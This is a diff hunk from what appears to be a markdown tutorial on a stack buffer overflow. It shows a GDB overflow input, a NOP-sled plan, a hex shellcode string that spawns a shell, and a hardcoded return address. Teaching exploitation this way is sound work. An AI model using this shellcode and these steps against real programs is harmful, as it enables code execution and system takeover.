@@ -35,11 +35,11 @@ run $(python -c 'print 128 * "A" + "BBBB"+ "CCCC"') #where B is the $ebp and C i
 x/700xw $esp #analyzing the stack to detect "AAAA" B(41414141)
 ```
 
-With GDB we see that in the stack we have "CCCC" in the return address of strcpy, then here we will put our middle-address of the  **NOP-Sled**. Again, any [shellcode](https://www.exploit-db.com/shellcodes/47513) can be used if it is small enough to fit into the NOPs.
+With GDB we see that in the stack we have "CCCC" in the **return address** of strcpy, then here we will put our middle-address of the  **NOP-Sled**. Again, any [shellcode](https://www.exploit-db.com/shellcodes/47513) can be used if it is small enough to fit into the NOPs.
 
 `shellcode="\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"`
 
-`return address="\x4c\xd8\xff\xff"` (You can also choose yours analyzing the stack)
+`return address="\x4c\xd8\xff\xff"`
 
 Number of NOPs = **128**(buff) - **25**(shellcode) + **4**($ebp) = 107
 
